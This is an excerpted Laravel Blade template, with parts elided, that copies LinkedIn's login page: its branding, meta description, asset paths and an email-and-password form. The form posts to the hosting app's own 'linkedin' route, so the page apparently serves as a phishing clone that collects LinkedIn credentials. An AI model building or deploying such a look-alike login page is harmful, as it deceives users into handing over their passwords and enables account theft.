...
<head>
    ...
    <link rel="shortcut icon" href="{{ asset('img/linkedin/9lb1g1kp916tat669q9r5g2kz') }}">
    ...
    <meta name="twitter:description"
        content="Login to LinkedIn to keep in touch with people you know, share ideas, and build your career.">
    <link rel="stylesheet" href="{{ asset('css/linkedin/4li12pah6li7xka3r69y2hqap.css') }}">
    ...
    <link rel="preload" href="{{ asset('js/linkedin/77qnm4uzm172xn82kvifmelfu') }}" as="script">
...
<body class="system-fonts ">
    <div id="app__container">
        <header><a class="linkedin-logo" href="{{ route('linkedin') }}" aria-label="Linkedin">
        ...
        <main class="app__content" role="main">
            ...
            <div id="" class="card-layout">
                <div id="organic-div" class="">
                    ...
                    <form method="post" class="login__form" action="{{ url('linkedin') }}" novalidate="">
                        ...
                        <div class="form__input--floating mt-24">
                            <input id="username" name="username" type="text"
                                ...
                                autofocus="" aria-label="Email or Phone">
                                <label class="form__label--floating"
                        ...
                        <div class="form__input--floating mt-24">
                            ...
                            <input id="password" type="password"
                                aria-describedby="error-for-password" name="password" required=""
